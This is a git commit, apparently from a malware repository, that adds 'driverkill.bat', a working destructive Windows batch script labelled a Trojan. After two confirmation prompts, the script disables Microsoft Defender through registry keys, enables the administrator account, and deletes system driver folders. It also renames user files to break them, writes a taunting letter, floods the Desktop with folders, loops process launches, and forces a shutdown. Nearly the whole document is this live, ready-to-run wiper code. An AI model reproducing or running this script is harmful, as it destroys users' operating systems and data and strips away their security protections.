b757b43514a0aa51d98c0bd00f3f3a0b30dbdd5a
M@lwar3 <144142418+adoomyxx@users.noreply.github.com>
2024-10-17 01:06:20 +0400

    Win32:Killer, Type of virus: Trojan
    Win32:Killer, Type of virus: Trojan

---
+++ driverkill.bat
@@ -0,0 +1,378 @@
+@echo off
+net user administrator /active:yes
+title WARNING! 
+echo this is malware that will delete hardware files and kill your pc, are you sure you wanna run this malware?
+pause
+cls
+title FINAL WARNING! 
+echo this malware will harm your computer and make thousands of dollars worth of damage it is recommended to use a virtual machine and only run this file if you know what you are doing, are you sure you wanna run this? 
+pause
+cls
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiTrojan /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiMalware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiRansomware /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableRealTimeProtection /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiThreats /t REG_DWORD /d 1 /f
+takeown /f /s /q C:\Windows\System32
+takeown /f /s /q C:\Windows\Web
+del /f /s /q C:\Windows\Web
+del /f /s /q C:\Windows\System32\Drivers
+del /f /s /q C:\Windows\System32\DriverStore
+cd C:\Users\%USERNAME%
+ren *.exe *.s5ga7
+ren *.cmd *.z7w9a
+ren *.png *.3ab6y
+ren *.jpg *.a5gf6
+ren *.ps1 *.r4o9a
+ren *.pdf *.a4o9z
+ren *.xlsx *.f5gv1
+ren *.pptx *.v12fa
+ren *.mp1 *.g6n8a
+ren *.mp2 *.b12p0
+ren *.mp3 *.z1a9o
+ren *.mp4 *.r1d3a
+ren *.mp5 *.q1o3r
+echo x=msgbox ("Still using this computer?",0+48,"lol")>>lol.vbs
+echo your computer has killed by the driverkill virus, your pc will not boot up again, enjoy seeing your pc being destructed>>letter.txt
+echo :)>>letter.txt
+echo do not try and restart your pc in anyway from now on, because if you do it will still be destruction>>letter.txt
+echo if you try and kill the process with task manager, it will look safe and sound but i encrypted your files and deleted your hardware files>>letter.txt
+start letter.txt
+timeout 2
+:payload1
+cd C:\Users\%USERNAME%\Desktop
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+md %random%
+timeout 2
+:payload2
+start cmd
+timeout 1
+start cmd
+start cmd
+start www.youtube.com
+timeout 2
+start lol.vbs
+start lol.vbs
+start lol.vbs
+timeout 2
+shutdown /s /t 60 /c "You have 1 minute to see the final payload :)"
+0%|0%
+:payload3
+start calc
+start cmd
+start mspaint
+goto payload3
